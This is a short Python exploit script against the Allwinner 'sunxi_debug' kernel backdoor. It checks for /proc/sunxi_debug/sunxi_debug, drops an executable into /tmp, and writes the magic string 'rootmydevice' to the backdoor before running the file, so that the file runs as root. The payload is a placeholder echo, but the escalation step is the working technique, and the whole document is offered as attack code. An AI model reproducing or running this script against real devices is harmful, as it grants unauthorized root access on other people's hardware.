import os
import random
import string
import sys

class AllwinnerPrivilegeEscalation:
    def __init__(self, payload_file_name):
        self.backdoor_path = "/proc/sunxi_debug/sunxi_debug"
        self.payload_file_name = payload_file_name

    def check(self):
        """Check if the backdoor exists."""
        if os.path.exists(self.backdoor_path):
            print("[+] Backdoor exists: Exploitation is possible.")
            return True
        else:
            print("[-] Backdoor not found: Exploitation is not possible.")
            return False

    def generate_payload(self):
        """Simulate payload generation."""
        payload = b"echo 'malicious_payload'"
        print("[+] Payload generated.")
        return payload

    def write_payload_to_file(self, payload, path):
        """Write the payload to a file."""
        try:
            with open(path, "wb") as file:
                file.write(payload)
            os.chmod(path, 0o755)
            print(f"[+] Payload written to {path} and made executable.")
        except Exception as e:
            print(f"[-] Error writing payload: {e}")

    def exploit(self):
        """Execute the exploit."""
        if self.check():
            payload = self.generate_payload()
            exe_file = f"/tmp/{self.payload_file_name}.elf"
            self.write_payload_to_file(payload, exe_file)

            try:
                print("[+] Escalating privileges...")
                os.system(f"echo rootmydevice > {self.backdoor_path}; {exe_file}")
                print("[+] Exploit executed.")
            except Exception as e:
                print(f"[-] Exploit failed: {e}")
        else:
            print("[-] Exploit cannot proceed: Backdoor not found.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 exploit.py <payload_filename>")
        sys.exit(1)
    
    payload_file_name = sys.argv[1]
    exploit = AllwinnerPrivilegeEscalation(payload_file_name)
    exploit.exploit()